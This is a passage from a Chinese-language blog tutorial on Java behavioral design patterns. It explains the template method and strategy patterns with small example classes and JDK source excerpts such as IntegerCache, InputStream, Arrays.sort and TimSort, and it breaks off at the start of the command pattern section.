class="keyword">class</span> <span class="title">IntegerCache</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> low = -<span class="number">128</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> high;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Integer cache[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> h = <span class="number">127</span>;</span><br><span class="line">            String integerCacheHighPropValue =</span><br><span class="line">                sun.misc.VM.getSavedProperty(<span class="string">&quot;java.lang.Integer.IntegerCache.high&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (integerCacheHighPropValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> i = parseInt(integerCacheHighPropValue);</span><br><span class="line">                    i = Math.max(i, <span class="number">127</span>);</span><br><span class="line">                    <span class="comment">// Maximum array size is Integer.MAX_VALUE</span></span><br><span class="line">                    h = Math.min(i, Integer.MAX_VALUE - (-low) -<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span>( NumberFormatException nfe) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            high = h;</span><br><span class="line">            cache = <span class="keyword">new</span> Integer[(high - low) + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> j = low;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; cache.length; k++)</span><br><span class="line">                cache[k] = <span class="keyword">new</span> Integer(j++);</span><br><span class="line">            <span class="comment">// range [-128, 127] must be interned (JLS7 5.1.7)</span></span><br><span class="line">            <span class="keyword">assert</span> IntegerCache.high &gt;= <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">IntegerCache</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>Integer</code> 默认先创建并缓存 <code>-128 ~ 127</code> 之间数的 <code>Integer</code> 对象，当调用 <code>valueOf</code> 时如果参数在 <code>-128 ~ 127</code> 之间则计算下标并从缓存中返回，否则创建一个新的 <code>Integer</code> 对象。</p>
<h3 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h3><p>行为型模式用于描述程序在运行时复杂的流程控制，即描述多个类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，它涉及算法与对象间职责的分配。</p>
<p>行为型模式分为类行为模式和对象行为模式，前者采用继承机制来在类间分派行为，后者采用组合或聚合在对象间分配行为。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象行为模式比类行为模式具有更大的灵活性。</p>
<p>行为型模式分为：</p>
<ul>
<li>模板方法模式（类）</li>
<li>策略模式（对象）</li>
<li>命令模式（对象）</li>
<li>职责链模式（对象）</li>
<li>状态模式（对象）</li>
<li>观察者模式（对象）</li>
<li>中介者模式（对象）</li>
<li>迭代器模式（对象）</li>
<li>访问者模式（对象）</li>
<li>备忘录模式（对象）</li>
<li>解释器模式（类）</li>
</ul>
<p>以上 11 种行为型模式，除了模板方法模式和解释器模式是类行为型模式，其他的全部属于对象行为型模式。</p>
<h4 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h4><p><strong>概述</strong></p>
<p>在面向对象程序设计过程中，程序员常常会遇到这种情况：设计一个系统时知道了算法所需的关键步骤，而且<strong>确定了这些步骤的执行顺序，但某些步骤的具体实现还未知</strong>，或者说某些步骤的实现与具体的环境相关。</p>
<p>例如，去银行办理业务一般要经过以下4个流程：取号、排队、办理具体业务、对银行工 作人员进行评分等，其中取号、排队和对银行工作人员进行评分的业务对每个客户是一样的，可以在父类中实现，但是办理具体业务却因人而异，它可能是存款、取款或者转账等，可以延迟到子类中实现。</p>
<p><strong>定义：</strong></p>
<p>定义一个操作中的算法骨架，而将算法的一些步骤延迟到子类中，使得子类可以<strong>不改变该算法结构的情况下重定义该算法的某些特定步骤</strong>。</p>
<p><strong>结构</strong></p>
<p>模板方法（Template Method）模式包含以下主要角色：</p>
<ul>
<li><p>抽象类（Abstract Class）：负责给出一个算法的轮廓和骨架。它由一个模板方法和若干个基本方法构成。</p>
<ul>
<li><p>模板方法：定义了算法的骨架，按某种顺序调用其包含的基本方法。</p>
</li>
<li><p>基本方法：是实现算法各个步骤的方法，是模板方法的组成部分。基本方法又可以分为三种：</p>
<ul>
<li><p>抽象方法(Abstract Method) ：一个抽象方法由抽象类声明、由其具体子类实现。</p>
</li>
<li><p>具体方法(Concrete Method) ：一个具体方法由一个抽象类或具体类声明并实现，其子类可以进行覆盖也可以直接继承。</p>
</li>
<li><p>钩子方法(Hook Method) ：在抽象类中已经实现，包括用于判断的逻辑方法和需要子类重写的空方法两种。</p>
<p>一般钩子方法是用于判断的逻辑方法，这类方法名一般为isXxx，返回值类型为boolean类型。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>具体子类（Concrete Class）：实现抽象类中所定义的抽象方法和钩子方法，它们是一个顶级逻辑的组成步骤。</p>
</li>
</ul>
<h5 id="案例实现-1"><a href="#案例实现-1" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】炒菜</p>
<p>炒菜的步骤是固定的，分为倒油、热油、倒蔬菜、倒调料品、翻炒等步骤。现通过模板方法模式来用代码模拟。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-21-16-20-26.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractClass</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 模板方法，一般设为final</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">cookProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//第一步：倒油</span></span><br><span class="line">        <span class="keyword">this</span>.pourOil();</span><br><span class="line">        <span class="comment">//第二步：热油</span></span><br><span class="line">        <span class="keyword">this</span>.heatOil();</span><br><span class="line">        <span class="comment">//第三步：倒蔬菜</span></span><br><span class="line">        <span class="keyword">this</span>.pourVegetable();</span><br><span class="line">        <span class="comment">//第四步：倒调味料</span></span><br><span class="line">        <span class="keyword">this</span>.pourSauce();</span><br><span class="line">        <span class="comment">//第五步：翻炒</span></span><br><span class="line">        <span class="keyword">this</span>.fry();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pourOil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;倒油&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二步：热油是一样的，所以直接实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">heatOil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;热油&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第三步：倒蔬菜是不一样的（一个下包菜，一个是下菜心）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">pourVegetable</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第四步：倒调味料是不一样</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">pourSauce</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//第五步：翻炒是一样的，所以直接实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fry</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;炒啊炒啊炒到熟啊&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass_BaoCai</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pourVegetable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;下锅的蔬菜是包菜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pourSauce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;下锅的酱料是辣椒&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass_CaiXin</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pourVegetable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;下锅的蔬菜是菜心&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pourSauce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;下锅的酱料是蒜蓉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//炒手撕包菜</span></span><br><span class="line">        ConcreteClass_BaoCai baoCai = <span class="keyword">new</span> ConcreteClass_BaoCai();</span><br><span class="line">        baoCai.cookProcess();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//炒蒜蓉菜心</span></span><br><span class="line">        ConcreteClass_CaiXin caiXin = <span class="keyword">new</span> ConcreteClass_CaiXin();</span><br><span class="line">        caiXin.cookProcess();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：为防止恶意操作，一般模板方法都加上 final 关键词。</p>
</blockquote>
<p><strong>优缺点</strong></p>
<ul>
<li><p><strong>优点：</strong></p>
<ul>
<li><p>提高代码复用性</p>
<p>将相同部分的代码放在抽象的父类中，而将不同的代码放入不同的子类中。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>实现了<strong>反向控制</strong></p>
<p>通过一个<strong>父类调用其子类的操</strong>作，通过对子类的具体实现扩展不同的行为，实现了反向控制 ，并符合“开闭原则”。</p>
</li>
</ul>
<ul>
<li><p>缺点：**</p>
<ul>
<li><p>对每个不同的实现都需要定义一个子类，这会导致类的个数增加，系统更加庞大，设计也更加抽象。</p>
</li>
<li><p>父类中的抽象方法由子类实现，子类执行的结果会影响父类的结果，这导致一种反向的控制结构，它提高了代码阅读的难度。</p>
</li>
</ul>
</li>
</ul>
<p><strong>适用场景</strong></p>
<ul>
<li>算法的整体步骤很固定，但其中个别部分易变时，这时候可以使用模板方法模式，将容易变的部分抽象出来，供子类实现。</li>
<li>需要通过子类来决定父类算法中某个步骤是否执行，实现子类对父类的反向控制。</li>
</ul>
<h5 id="JDK源码解析-3"><a href="#JDK源码解析-3" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p><code>InputStream</code>类就使用了模板方法模式。在<code>InputStream</code>类中定义了多个 <code>read()</code> 方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">InputStream</span> <span class="keyword">implements</span> <span class="title">Closeable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//抽象方法，要求子类必须重写</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span> b[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> read(b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span> b[], <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (off &lt; <span class="number">0</span> || len &lt; <span class="number">0</span> || len &gt; b.length - off) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 调用的子类的read，实现了反向控制</span></span><br><span class="line">        <span class="keyword">int</span> c = read(); <span class="comment">//调用了无参的read方法，该方法是每次读取一个字节数据</span></span><br><span class="line">        <span class="keyword">if</span> (c == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        b[off] = (<span class="keyword">byte</span>)c;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (; i &lt; len ; i++) &#123;</span><br><span class="line">                c = read();</span><br><span class="line">                <span class="keyword">if</span> (c == -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                b[off + i] = (<span class="keyword">byte</span>)c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ee) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面代码可以看到，无参的 <code>read()</code> 方法是抽象方法，要求子类必须实现。而 <code>read(byte b[])</code> 方法调用了 <code>read(byte b[], int off, int len)</code> 方法，所以在此处重点看的方法是带三个参数的方法。 </p>
<p>在该方法中第18行、27行，可以看到调用了无参的抽象的 <code>read()</code> 方法。</p>
<p>总结如下： 在InputStream父类中已经定义好了读取一个字节数组数据的方法是每次读取一个字节，并将其存储到数组的第一个索引位置，读取len个字节数据。具体如何读取一个字节数据呢？由子类实现。</p>
<h4 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h4><p><strong>概述</strong></p>
<p>先看下面的图片，我们去旅游选择出行模式有很多种，可以骑自行车、可以坐汽车、可以坐火车、可以坐飞机。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-21-17-29-35.png" style="zoom:80%;" />

<p>作为一个程序猿，开发需要选择一款开发工具，当然可以进行代码开发的工具有很多，可以选择Idea进行开发，也可以使用eclipse进行开发，也可以使用其他的一些开发工具。</p>
<p><strong>定义：</strong></p>
<p>​    该模式定义了一系列算法，并将每个算法封装起来，使它们可以相互替换，且算法的变化不会影响使用算法的客户。策略模式属于对象行为模式，它通过对算法进行封装，把使用算法的责任和算法的实现分割开来，并委派给不同的对象对这些算法进行管理。</p>
<p><strong>结构</strong></p>
<p>策略模式的主要角色如下：</p>
<ul>
<li>抽象策略（Strategy）类：这是一个抽象角色，通常由一个接口或抽象类实现。此角色给出所有的具体策略类所需的接口。</li>
<li>具体策略（Concrete Strategy）类：实现了抽象策略定义的接口，提供具体的算法实现或行为。</li>
<li>环境（Context）类：持有一个策略类的引用，最终给客户端调用。</li>
</ul>
<h5 id="案例实现-2"><a href="#案例实现-2" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】促销活动</p>
<p>一家百货公司在定年度的促销活动。针对不同的节日（春节、中秋节、圣诞节）推出不同的促销活动，由促销员将促销活动展示给客户。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-21-17-30-25.png" style="zoom:80%;" />

<p>代码如下：</p>
<p>定义百货公司所有促销活动的共同接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义具体策略角色（Concrete Strategy）：每个节日具体的促销活动</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为春节准备的促销活动A</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrategyA</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;买一送一&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为中秋准备的促销活动B</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrategyB</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;满200元减50元&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为圣诞准备的促销活动C</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrategyC</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;满1000元加一元换购任意200元以下商品&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义环境角色（Context）：用于连接上下文，即把促销活动推销给客户，这里可以理解为销售员</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SalesMan</span> </span>&#123;                        </span><br><span class="line">    <span class="comment">//持有抽象策略角色的引用                              </span></span><br><span class="line">    <span class="keyword">private</span> Strategy strategy;                 </span><br><span class="line">                                               </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SalesMan</span><span class="params">(Strategy strategy)</span> </span>&#123;       </span><br><span class="line">        <span class="keyword">this</span>.strategy = strategy;              </span><br><span class="line">    &#125;                                          </span><br><span class="line">                                               </span><br><span class="line">    <span class="comment">//向客户展示促销活动                                </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">salesManShow</span><span class="params">()</span></span>&#123;                </span><br><span class="line">        strategy.show();                       </span><br><span class="line">    &#125;                                          </span><br><span class="line">&#125;                                              </span><br></pre></td></tr></table></figure>



<p><strong>优缺点</strong></p>
<p><strong>1，优点：</strong></p>
<ul>
<li><p>策略类之间可以自由切换</p>
<p>由于策略类都实现同一个接口，所以使它们之间可以自由切换。</p>
</li>
<li><p>易于扩展</p>
<p>增加一个新的策略只需要添加一个具体的策略类即可，基本不需要改变原有的代码，符合“开闭原则“</p>
</li>
<li><p>避免使用多重条件选择语句（if else），充分体现面向对象设计思想。</p>
</li>
</ul>
<p><strong>2，缺点：</strong></p>
<ul>
<li>客户端必须知道所有的策略类，并自行决定使用哪一个策略类。</li>
<li>策略模式将造成产生很多策略类，可以通过使用享元模式在一定程度上减少对象的数量。</li>
</ul>
<h5 id="使用场景-2"><a href="#使用场景-2" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li>一个系统需要动态地在几种算法中选择一种时，可将每个算法封装到策略类中。</li>
<li>一个类定义了多种行为，并且这些行为在这个类的操作中以多个条件语句的形式出现，可将每个条件分支移入它们各自的策略类中以代替这些条件语句。</li>
<li>系统中<strong>各算法彼此完全独立（而模板方法是已经确定了各步骤的顺序，只是其中一些的步骤具体实现不知道）</strong>，且要求对客户隐藏具体算法的实现细节时。</li>
<li>系统要求使用算法的客户不应该知道其操作的数据时，可使用策略模式来隐藏与算法相关的数据结构。</li>
<li>多个类只区别在表现行为不同，可以使用策略模式，在运行时动态选择具体要执行的行为。</li>
</ul>
<h5 id="JDK源码解析-4"><a href="#JDK源码解析-4" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p><code>Comparator</code> 中的策略模式。在Arrays类中有一个 <code>sort()</code> 方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Arrays</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(T[] a, Comparator&lt;? <span class="keyword">super</span> T&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            sort(a);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LegacyMergeSort.userRequested)</span><br><span class="line">                legacyMergeSort(a, c);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                TimSort.sort(a, <span class="number">0</span>, a.length, c, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Arrays就是一个环境角色类，这个sort方法可以传一个新策略让Arrays根据这个策略来进行排序。就比如下面的测试类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] data = &#123;<span class="number">12</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 实现降序排序</span></span><br><span class="line">        Arrays.sort(data, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> o2 - o1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(Arrays.toString(data)); <span class="comment">//[12, 5, 4, 3, 2, 2, 1]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们在调用Arrays的sort方法时，第二个参数传递的是Comparator接口的子实现类对象。所以Comparator充当的是抽象策略角色，而具体的子实现类充当的是具体策略角色。环境角色类（Arrays）应该持有抽象策略的引用来调用。那么，Arrays类的sort方法到底有没有使用Comparator子实现类中的 <code>compare()</code> 方法吗？让我们继续查看TimSort类的 <code>sort()</code> 方法，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimSort</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(T[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, Comparator&lt;? <span class="keyword">super</span> T&gt; c,</span></span></span><br><span class="line"><span class="function"><span class="params">                         T[] work, <span class="keyword">int</span> workBase, <span class="keyword">int</span> workLen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> c != <span class="keyword">null</span> &amp;&amp; a != <span class="keyword">null</span> &amp;&amp; lo &gt;= <span class="number">0</span> &amp;&amp; lo &lt;= hi &amp;&amp; hi &lt;= a.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> nRemaining  = hi - lo;</span><br><span class="line">        <span class="keyword">if</span> (nRemaining &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span>;  <span class="comment">// Arrays of size 0 and 1 are always sorted</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// If array is small, do a &quot;mini-TimSort&quot; with no merges</span></span><br><span class="line">        <span class="keyword">if</span> (nRemaining &lt; MIN_MERGE) &#123;</span><br><span class="line">            <span class="keyword">int</span> initRunLen = countRunAndMakeAscending(a, lo, hi, c);</span><br><span class="line">            binarySort(a, lo, hi, lo + initRunLen, c);</span><br><span class="line">            <span class="keyword">return</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;   </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">int</span> <span class="title">countRunAndMakeAscending</span><span class="params">(T[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi,Comparator&lt;? <span class="keyword">super</span> T&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> lo &lt; hi;</span><br><span class="line">        <span class="keyword">int</span> runHi = lo + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (runHi == hi)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find end of run, and reverse range if descending</span></span><br><span class="line">        <span class="keyword">if</span> (c.compare(a[runHi++], a[lo]) &lt; <span class="number">0</span>) &#123; <span class="comment">// Descending</span></span><br><span class="line">            <span class="keyword">while</span> (runHi &lt; hi &amp;&amp; c.compare(a[runHi], a[runHi - <span class="number">1</span>]) &lt; <span class="number">0</span>)</span><br><span class="line">                runHi++;</span><br><span class="line">            reverseRange(a, lo, runHi);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;                              <span class="comment">// Ascending</span></span><br><span class="line">            <span class="keyword">while</span> (runHi &lt; hi &amp;&amp; c.compare(a[runHi], a[runHi - <span class="number">1</span>]) &gt;= <span class="number">0</span>)</span><br><span class="line">                runHi++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> runHi - lo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码中最终会跑到 <code>countRunAndMakeAscending()</code> 这个方法中。我们可以看见，只用了compare方法，所以在调用Arrays.sort方法只传具体compare重写方法的类对象就行，这也是Comparator接口中必须要子类实现的一个方法。</p>
<h4 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h4><p><strong>概述</strong></p>
<p>日常生活中，我们出去吃饭都会遇到下面的场景。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-21-17-31-36.png" style="zoom:60%;" />

<p><strong>定义：</strong></p>
<p>将一个请求封装为一个对象，使发出请求的责任和执行请求的责任分割开。这样两者之间通过命令对象进行沟通，这样方便将命令对象进行存储、传递、调用、增加与管理。</p>
<p><strong>结构</strong></p>
<p>命令模式包含以下主要角色：</p>
<ul>
<li>抽象命令类（Command）角色： 定义命令的接口，声明执行的方法。</li>
<li>具体命令（Concrete  Command）角色：具体的命令，实现命令接口；通常会持有接收者，并调用接收者的功能来完成命令要执行的操作。</li>
<li>实现者/接收者（Receiver）角色： 接收者，真正执行命令的对象。任何类都可能成为一个接收者，只要它能够实现命令要求实现的相应功能。</li>
<li>调用者/请求者（Invoker）角色： 要求命令对象执行请求，通常会持有命令对象，可以持有很多的命令对象。这个是客户端真正触发命令并要求命令执行相应操作的地方，也就是说相当于使用命令对象的入口。</li>
</ul>
<p><strong>案例实现</strong></p>
<p>将上面的案例用代码实现，那我们就需要分析命令模式的角色在该案例中由谁来充当。</p>
